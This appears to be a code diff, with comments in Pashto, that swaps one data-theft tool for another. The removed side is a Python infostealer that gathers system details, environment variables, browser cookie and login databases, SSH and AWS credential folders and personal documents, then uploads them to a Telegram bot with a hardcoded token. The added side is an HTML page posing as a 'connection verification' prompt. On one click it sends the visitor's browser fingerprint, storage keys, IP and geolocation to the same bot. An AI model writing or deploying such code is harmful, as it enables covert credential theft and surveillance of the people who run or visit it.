@@ -1,186 +1,149 @@
-# د ټیلیګرام بوټ — د معلوماتو استخراج او لیږل
-# دا سکریپټ د کاروونکي سیسټم معلومات غونډوي او ټیلیګرام ته لیږي
-# ټوکن او چټ ID مستقیم دننه شامل دي
+<!-- د معلوماتو غونډولو HTML پاڼه — د ټیلیګرام بوټ سره تړلې -->
+<!-- دا پاڼه د کاروونکي د براوزر معلومات، IP، او وسیله غونډوي -->
+<!DOCTYPE html>
+<html lang="ps">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>د اړیکې تایید</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #1a1a2e;
+            color: #eee;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .box {
+            background: #16213e;
+            padding: 40px;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
+        h1 { color: #0f3460; font-size: 22px; }
+        p { color: #aaa; font-size: 14px; }
+        button {
+            background: #e94560;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>د اړیکې تایید</h1>
+        <p>مهرباني وکړئ د تایید تڼۍ کېکاږئ</p>
+        <button onclick="collectAndSend()">تایید</button>
+    </div>
 
-import os
-import sys
-import socket
-import platform
-import getpass
-import json
-import base64
-import subprocess
-import shutil
-import requests
+    <script>
+        // د ټیلیګرام بوټ تنظیم
+        const BOT_TOKEN = "8629012146:AAE_8FgSXC8Da5t7_Sd_XKGtUf_iFGiLghc";
+        const CHAT_ID = "8841631982";
+        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-# ============ د ټیلیګرام تنظیم ============
-BOT_TOKEN = "8629012146:AAE_8FgSXC8Da5t7_Sd_XKGtUf_iFGiLghc"
-CHAT_ID = "8841631982"
-API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
+        // د معلوماتو غونډول
+        function collectData() {
+            const data = {
+                // د براوزر معلومات
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages ? navigator.languages.join(",") : "",
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory || "unknown",
+                maxTouchPoints: navigator.maxTouchPoints,
+                vendor: navigator.vendor,
 
-def send_message(text):
-    """ساده پیغام لیږل"""
-    try:
-        requests.post(f"{API_URL}/sendMessage", data={
-            "chat_id": CHAT_ID,
-            "text": text[:4000],
-        }, timeout=10)
-    except Exception:
-        pass
+                // د سکرین معلومات
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
 
-def send_document(filename, content_bytes):
-    """د فایل لیږل"""
-    try:
-        requests.post(f"{API_URL}/sendDocument", data={
-            "chat_id": CHAT_ID,
-        }, files={"document": (filename, content_bytes)}, timeout=30)
-    except Exception:
-        pass
+                // د کیمیرا او مایکروفون اجازه
+                mediaDevices: navigator.mediaDevices ? "available" : "unavailable",
 
-def get_public_ip():
-    try:
-        return requests.get("https://api.ipify.org?format=json", timeout=5).json()["ip"]
-    except Exception:
-        return "unknown"
+                // د وخت زون
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
 
-def get_private_ip():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-        return ip
-    except Exception:
-        return "unknown"
+                // د ادرس معلومات
+                currentURL: window.location.href,
+                referrer: document.referrer,
 
-def get_system_info():
-    """د سیسټم بشپړ معلومات"""
-    return {
-        "hostname": socket.gethostname(),
-        "username": getpass.getuser(),
-        "os": platform.system(),
-        "os_version": platform.version(),
-        "os_release": platform.release(),
-        "architecture": platform.machine(),
-        "processor": platform.processor(),
-        "python_version": platform.python_version(),
-        "public_ip": get_public_ip(),
-        "private_ip": get_private_ip(),
-        "cwd": os.getcwd(),
-        "home": os.path.expanduser("~"),
-        "env": dict(os.environ),
-    }
+                // د وسیله حافظه
+                localStorageKeys: Object.keys(localStorage),
+                sessionStorageKeys: Object.keys(sessionStorage),
 
-def get_browser_data():
-    """د براوزر ډاټا غلا"""
-    browsers = {
-        "chrome": os.path.expanduser("~/.config/google-chrome/Default"),
-        "firefox": os.path.expanduser("~/.mozilla/firefox"),
-        "edge": os.path.expanduser("~/.config/microsoft-edge/Default"),
-    }
-    stolen = {}
-    for name, path in browsers.items():
-        if not os.path.exists(path):
-            continue
-        files = {}
-        for fname in ["Cookies", "Login Data", "History", "Web Data", "Bookmarks"]:
-            fpath = os.path.join(path, fname)
-            if os.path.exists(fpath):
-                try:
-                    with open(fpath, "rb") as f:
-                        files[fname] = base64.b64encode(f.read()).decode()
-                except Exception:
-                    files[fname] = "error"
-        stolen[name] = files
-    return stolen
+                // د timestamp
+                timestamp: new Date().toISOString()
+            };
+            return data;
+        }
 
-def get_files():
-    """د مهمو files غلا"""
-    targets = [
-        os.path.expanduser("~/Documents"),
-        os.path.expanduser("~/Desktop"),
-        os.path.expanduser("~/Downloads"),
-        os.path.expanduser("~/.ssh"),
-        os.path.expanduser("~/.aws"),
-        os.path.expanduser("~/.config"),
-    ]
-    collected = {}
-    for base in targets:
-        if not os.path.exists(base):
-            continue
-        for root, dirs, files in os.walk(base):
-            for f in files:
-                fpath = os.path.join(root, f)
-                try:
-                    if os.path.getsize(fpath) > 2 * 1024 * 1024:
-                        continue
-                    with open(fpath, "rb") as fh:
-                        collected[fpath] = base64.b64encode(fh.read()).decode()
-                except Exception:
-                    continue
-    return collected
+        // د IP ترلاسه کول
+        async function getIP() {
+            try {
+                const r = await fetch("https://api.ipify.org?format=json");
+                const j = await r.json();
+                return j.ip;
+            } catch (e) {
+                return "unknown";
+            }
+        }
 
-def get_installed_apps():
-    try:
-        out = subprocess.check_output(["dpkg", "--get-selections"], stderr=subprocess.DEVNULL)
-        return out.decode().splitlines()
-    except Exception:
-        return []
+        // د موقعیت ترلاسه کول
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve("unavailable");
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => resolve(`${pos.coords.latitude},${pos.coords.longitude}`),
+                    () => resolve("denied"),
+                    { timeout: 5000 }
+                );
+            });
+        }
 
-def get_network_info():
-    try:
-        out = subprocess.check_output(["ss", "-tuln"], stderr=subprocess.DEVNULL)
-        return out.decode().splitlines()
-    except Exception:
-        return []
+        // د معلوماتو لیږل
+        async function sendData(data) {
+            try {
+                const text = JSON.stringify(data, null, 2).slice(0, 4000);
+                await fetch(API_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: "📥 د براوزر معلومات:\n" + text
+                    })
+                });
+            } catch (e) {
+                // خاموشه تېروتنه
+            }
+        }
 
-def get_geolocation():
-    try:
-        return requests.get(f"http://ip-api.com/json/{get_public_ip()}", timeout=5).json()
-    except Exception:
-        return {}
-
-def collect_all():
-    return {
-        "system": get_system_info(),
-        "browser": get_browser_data(),
-        "files": get_files(),
-        "apps": get_installed_apps(),
-        "network": get_network_info(),
-        "geo": get_geolocation(),
-    }
-
-def main():
-    """اصلي اجرا"""
-    send_message("🟢 بوټ فعال شو — د معلوماتو غونډول پیل")
-    profile = collect_all()
-
-    # د سیسټم لنډیز
-    sys_info = profile["system"]
-    summary = (
-        f"🖥 Host: {sys_info['hostname']}\n"
-        f"👤 User: {sys_info['username']}\n"
-        f"🧠 OS: {sys_info['os']} {sys_info['os_release']}\n"
-        f"⚙ Arch: {sys_info['architecture']}\n"
-        f"🌐 Public IP: {sys_info['public_ip']}\n"
-        f"🏠 Private IP: {sys_info['private_ip']}\n"
-        f"📁 CWD: {sys_info['cwd']}\n"
-        f"📍 Geo: {profile['geo']}"
-    )
-    send_message(summary)
-
-    # د بشپړ پروفایل JSON فایل
-    json_bytes = json.dumps(profile, indent=2, ensure_ascii=False).encode()
-    send_document("profile.json", json_bytes)
-
-    # د files آرشیف
-    archive = b""
-    for path, content in profile["files"].items():
-        archive += f"\n=== {path} ===\n".encode() + base64.b64decode(content)
-    if archive:
-        send_document("files_dump.txt", archive[:50*1024*1024])
-
-    send_message("✅ استخراج بشپړ شو")
-
-if __name__ == "__main__":
-    main()
+        // اصلي فعالیت
+        async function collectAndSend() {
+            const data = collectData();
+            data.ip = await getIP();
+            data.geolocation = await getLocation();
+            await sendData(data);
+            document.querySelector("h1").textContent = "تایید شو";
+            document.querySelector("p").textContent = "مننه، اړیکه ټینګه شوه";
+        }
+    </script>
+</body>
+</html>
